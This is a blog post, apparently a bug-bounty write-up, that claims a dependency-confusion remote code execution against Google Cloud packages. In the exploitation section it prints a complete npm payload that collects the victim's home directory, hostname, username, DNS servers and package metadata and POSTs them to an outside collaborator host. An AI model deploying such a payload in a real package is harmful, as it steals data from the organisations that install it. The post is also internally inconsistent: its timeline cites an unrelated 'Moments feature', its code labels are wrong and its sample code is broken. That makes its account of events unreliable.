+++
title = "How I Saved Christmas for Google 🎄"
date = "2021-12-25"
author = "0xdroopy"


+++

## Introduction 

It was a cold winter morning. I woke up early as I had to start my journey on a great program which was none other than Google Vrp. I read many blog posts on google by different amazing authours and then hunting on google came on my mind. Usually I am not a type of pentester who looks for low hanging bugs, rather I go for them having higher impact and higher difficulty in finding. 

{{< image src="https://storage.googleapis.com/bughunters-social/og_social_image_bughunters.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}
## How it started?

I was now looking at the scope for pentesting and I would love to say the scope is huge! Then my eyes came on to the product of google named Google Cloud. It is the cloud services offered by the google which indeed had many programs in it. So I took my debit card and got me enrolled in the Google Cloud Services. Now an attack that I have learnt from The Great Alex Birsan came to my mind about Dependency Confusion. 

{{< image src="https://miro.medium.com/max/1100/1*f7ZL8SHoOv_9ZrHDa56tvg.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

## What the hell is Dependency Confusion?

So let me not waste the times for anyone and explain it so easily that it would be understood by even beginner also. Dependency Confusison is a attack by which an attacker is able to perform Remote Code Execution in a server by providing a package of same name with higher version with that used by a server, which makes server attracted towards higher version pipeline. You would be familiar when we install the packages for computer using the terminal.
There are different types of packages having different framework like 

#### 1) Python


```bash
pip install <package name>
```
#### 2) Node

```bash
npm install <package name>
npm owner add <user> <package name>
```

#### 3) Ruby Gems
```bash
gem install <package name>
```
### Package Categories:-
#### 1) Public
The packages that we often use in terminal are Public Packages. Public Packages are exposed to the public in order to make them able to download different packages according to their needs. The public packages can also be identified as shown below-
```bash
pip install <package name>
```
 These packages can be uploaded on different websites for different frameworks talked above like -

### Pypi 

[**Pypi**](https://pypi.org) is a platform where you can upload various packages on your own based on python framework.

```python
import pathlib
from setuptools import setup

# The directory containing this file
HERE = pathlib.Path(__file__).parent

# The text of the README file
README = (HERE / "README.md").read_text()

# This call to setup() does all the work
setup(
    name="realpython-reader",
    version="1.0.0",
    description="Read the latest Real Python tutorials",
    long_description=README,
    long_description_content_type="text/markdown",
    url="https://github.com/realpython/reader",
    author="Real Python",
    author_email="info@realpython.com",
    license="MIT",
    classifiers=[
        "License :: OSI Approved :: MIT License",
        "Programming Language :: Python :: 3",
        "Programming Language :: Python :: 3.7",
    ],
    packages=["reader"],
    include_package_data=True,
    install_requires=["feedparser", "html2text"],
    entry_points={
        "console_scripts": [
            "realpython=reader.__main__:main",
        ]
    },
)
```


### Npm

Similarly in Node Js there is a platform name [**Npm**](https://www.npmjs.com/) which allows the user to upload open source packages.
```js
// module.exports exports the function getContests as a promise and exposes it as a module.
// we can import an exported module by using require().
module.exports = async function getContests() {
  const axios = require("axios"); // Importing the Axios module to make API requests
  var result;

  const username; // Insert Your Username here
  const api_key; //Insert API key here

  await axios // Making a GET request using axios and requesting information from the API
    .get(
      "https://clist.by/api/v1/json/contest/?username=" + username + "&api_key=" + api_key + "&limit=20&end__gt=2020-09-19T00%3A00%3A00"
    )
    .then((response) => { // If the GET request is successful, this block is executed
      return response; // The response of the API call is passed on to the next block
    })
    .then((contests) => { // In this block, we store the response data into a variable 'result'
      result = contests.data.objects;
    })
    .catch((err) => {
      console.log(err); // Error handler
    });
  return result; // The contest data is returned
};
```
### Private Packages
Bigger organisations like Google, Facebook, Apple make their own packages for their company by which their systems communicate and download internally. Usually these are done in order to mantain the privacy to the sensitive content in the organisation. The Private Package looks like-
```bash
pip install --index-ur=https://pip.company.com/ company-oauth
```
### Combined Packages
Not to our surprise there is a third category as well which allows the system to use both Public and Private packages giving us Combined Packages. These packages have a catch, they have to decide which package to decide. They usually go for this type of package which has a higher version as they didnt want to install the updated library for their system again and again.

{{< image src="https://docstore.mik.ua/orelly/oracle/prog2/figs/sql2.1603.gif" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

## What's the Bug here?

The combined Packages which we talked about recently makes the things more interesting and exploitable. What attacker's do is make the package of same name on the open-source platform with malicious code in it. By which when the system from the organization tries to access the package . Now the distinctive nature comes about JFrog Artifactory ,which makes the system to choose the package with the higher version rather than  the package on the same system. The attacker's upload the package with identical name with higher version than the internal package which makes the system or api to catch the pipeline of package having higher version.


{{< image src="https://miro.medium.com/max/660/1*k1O-vDpuNgECJ5nwMyw0tw.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

## Ah! The Recon!

In order to perform the recon I first wanted to know where and which the packages lie. Google Cloud Services uses packages which are not listed anywhere in the ocean of internet. I go throughed all the documentation of all the products in the Cloud Service but didn't have any clue about the heavy weight packages. Now my inner brain says lets go for Github Recon. After spending about 2 Hours it failed. Google dosen't save their information on Github at all. Now what I have to do is simply and most efficient which works for me - Automation! I have made many of the tools on my own , I will make them public after I give them a final touch. I began scanning the packages on all the products of Google Cloud Services. I slept at night making my VPS a kickstart. When I woked up early in morning, I was surprised. The Vps has almost found out 20-25 packages. Now I immediately have to see which one is private, public and combined. There were all types of packages including python and node.js.

## The Exploitaion
After investigating, I found out that the Combined packages were total of 9. Among which there were 5 python and 4 npm packages. I quickly went to the open-source programs listed before and quickly started searching which packages are missing and which are not? After a while , I founded Out of 9 only one package is missing on the platform. I quickly made a package with the same name of the package and wrote my Remote Code Execution Code below-

```java
//author:- mypackage@protonmail.com
const os = require("os");
const dns = require("dns");
const querystring = require("querystring");
const https = require("https");
const packageJSON = require("./package.json");
const package = packageJSON.name;

const trackingData = JSON.stringify({
    p: package,
    c: __dirname,
    hd: os.homedir(),
    hn: os.hostname(),
    un: os.userInfo().username,
    dns: dns.getServers(),
    r: packageJSON ? packageJSON.___resolved : undefined,
    v: packageJSON.version,
    pjson: packageJSON,
});

var postData = querystring.stringify({
    msg: trackingData,
});

var options = {
    hostname: "burpcollaborator.net", //replace burpcollaborator.net with Interactsh or pipedream
    port: 443,
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length,
    },
};

var req = https.request(options, (res) => {
    res.on("data", (d) => {
        process.stdout.write(d);
    });
});

req.on("error", (e) => {
    // console.error(e);
});

req.write(postData);
req.end();
```

In this malicious code above I put my burp collaborater in order to receive the callback if the code is being executed on the server. I waited, waited and waited. Callback hasn't came until 5 hours. I decided to wait 1 more hour and then just shutdown my whole plan. After around 33 minutes , I recieved a callback to my burp collaborater.

{{< image src="https://user-images.githubusercontent.com/8293321/135176099-0e3fa01c-bdce-4f04-a94f-de0a34c7abf6.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

This was something I never expected that happened now. I just left my system and gone out. After coming back I quickly reported to Google Vrp. Within 15 minutes my report got Triaged and Accepted. 

## Why it is considered as a Deep Gold Mine?
Yeah by this , everyone will believe that it is a gold mine and look for same type of bugs. But there's a catch, The way you recon means a lot. If your recon is weak then you would never be able to find this in the near time. Your recon should be accessible to all the endpoints withing the program and as well as using third party platforms - Github, Shodan , Google Dorks etc. The attack Dependency Confusion is still not very overrated but I want to disclose as this was a bit that I got from the community and here is what I returned.

{{< image src="https://64.media.tumblr.com/a76def644cc0b31881be79547604ee33/2c3aa8307bc296b3-e1/s540x810/4dedfb1c6a23bf52ae91154e79971567718ffbc4.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}



## Timeline:

[Dec 24, 2021] - Bug reported

[Dec 24, 2021] - Initial triage

[Dec 24, 2021] - Bug accepted (P4 -> P1)

[Jan 02, 2022] - Bug mitigated by temporarily disabling the Moments feature

[Jan 14, 2022] - Reward of $XXXX issued
